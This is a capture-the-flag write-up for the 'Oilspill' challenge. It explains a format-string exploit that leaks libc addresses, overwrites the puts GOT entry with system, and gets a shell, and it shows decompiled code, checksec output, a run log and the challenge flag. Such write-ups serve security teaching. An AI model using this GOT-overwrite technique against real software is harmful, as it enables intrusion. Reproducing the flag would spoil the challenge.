# Oilspill

Tooking at the decompiled C in `ghidra`, it is immeadiately obvious this is a format string attack.

```c
undefined8 main(undefined8 param_1,undefined8 param_2) {
    undefined8 in_R9;
    long in_FS_OFFSET;
    char local_148 [312];
    long local_10;

    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    printf("%p, %p, %p, %p\n",puts,printf,local_148,temp,in_R9,param_2);
    puts("Oh no! We spilled oil everywhere and its making everything dirty");
    puts("do you have any ideas of what we can use to clean it?");
    fflush(stdout);
    fgets(local_148,300,stdin);
    printf(local_148);
    puts("Interesting Proposition");
    fflush(stdout);
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return 0;
}
```
`checksec` shows that it is a static binary with no relro, meaning we can overwrite the GOT pointers.
```
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

To perform this attack, we take advantage of the `%n` format specifier which takes a pointer and writes the current number of characters written so far into the pointer. A more in depth explanation of format string exploits can be found [here](https://cs155.stanford.edu/papers/formatstring-1.2.pdf).<br>

Looking at the dockerfile shows they are running ubuntu 18.04, and the version of libc shipped with it is 2.27. The binary helpfully leaks the dynamic address of puts and printf which can be used along with libc.so.6 to calculate the libc base address. In order to exploit this binary to get a shell, the vulnerable printf is used to overwrite the GOT pointer of `puts` with the address of `system`. The first 8 bytes of "Interesting Proposition" will be overwritten with "/bin/sh\x00". After the printf is called, puts (now system) is called with "/bin/sh\x00" and gives us a shell.
```
[+] Opening connection to oil.sdc.tf on port 1337: Done
[*] '/home/runner/nothingtosee/OILSPILL/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/runner/nothingtosee/OILSPILL/oilspill'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
FILE PUTS ADDRESS: 0x600c18
DYNAMIC PUTS ADDRESS: 0x7fdd3a402970
DYNAMIC PRINTF ADDRESS: 0x7fdd3a3e6e40
LIBC PUTS OFFSET: 0x80970
LIBC ADDRESS: 0x7fdd3a382000
b'0x400677\nOh no! We spilled oil everywhere and its making everything dirty\ndo you have any ideas of what we can use to clean it?\n'
[*] Switching to interactive mode
$ ls
OilSpill
flag.txt
$ cat flag.txt
sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}
```
## Flag: sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}